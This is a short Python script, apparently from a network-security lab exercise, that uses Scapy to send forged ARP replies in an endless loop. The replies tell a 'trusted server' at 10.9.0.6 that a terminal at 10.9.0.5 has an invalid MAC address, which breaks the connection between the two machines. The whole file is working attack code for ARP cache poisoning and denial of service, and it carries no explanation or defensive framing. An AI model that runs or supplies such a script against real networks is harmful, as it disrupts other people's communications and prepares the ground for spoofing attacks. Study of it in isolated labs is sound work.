import sys
import time
from scapy.all import ARP, send


X_TERMINAL     = "10.9.0.5"
TRUSTED_SERVER = "10.9.0.6"
INVALID_MAC    = "77:77:77:77:77:77"


def arp_spoofing():
    """
    Realiza um ataque ARP Spoofing para derrubar a conexão entre o Trusted 
    Server e o X Terminal

    :return: None
    """

    sent_packets_count = 0

    # Repete o processo
    while True:
        sent_packets_count += 1
        
        # Monta pacote ARP com um MAC inválido para o Trusted Server
        response = ARP(
            op    = 2, 
            pdst  = TRUSTED_SERVER, 
            psrc  = X_TERMINAL, 
            hwsrc = INVALID_MAC
        )
        
        # Envia pacote ARP para o Trusted Server para derrubar a conexão
        send(response, verbose=False)

        print("[+] Packets sent " + str(sent_packets_count), end="\r")
        sys.stdout.flush()

        time.sleep(2)


if __name__ == "__main__":
    arp_spoofing()
    